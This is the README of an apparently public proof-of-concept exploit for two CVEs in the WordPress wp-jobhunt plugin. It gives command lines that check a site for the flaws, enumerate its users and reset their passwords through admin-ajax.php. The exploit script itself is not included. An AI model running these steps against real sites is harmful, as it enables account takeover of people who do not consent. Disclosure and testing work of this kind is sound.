# wp-jobhunt-exploit
CVE-2018-19487, CVE-2018-19488, exploit for WordPress wp-jobhunt plugin

wp-jobhunt plugin is a plugin used with JobCareer theme:

https://themeforest.net/item/jobcareer-job-board-responsive-wordpress-theme/14221636 (see changelog at the bottom)


Python exploit for **CVE-2018-19487** (AJAX user information disclosure) and **CVE-2018-19488** (AJAX user reset password) for version 2.2 and before.


**REQUIREMENTS:**
- requests
- urllib
- json


**HOW TO USE:**

Check if vulnerable to user enumeration:

```python poc.py --checkenum https://wpsite/path/to/wp-admin/admin-ajax.php```


Check if vulnerable to user reset pass:

```python poc.py --checkreset https://wpsite/path/to/wp-admin/admin-ajax.php```


Exploit user enumeration:

```python poc.py --enum https://wpsite/path/to/wp-admin/admin-ajax.php```


Exploit user reset password:

```python poc.py --reset https://wpsite/path/to/wp-admin/admin-ajax.php```
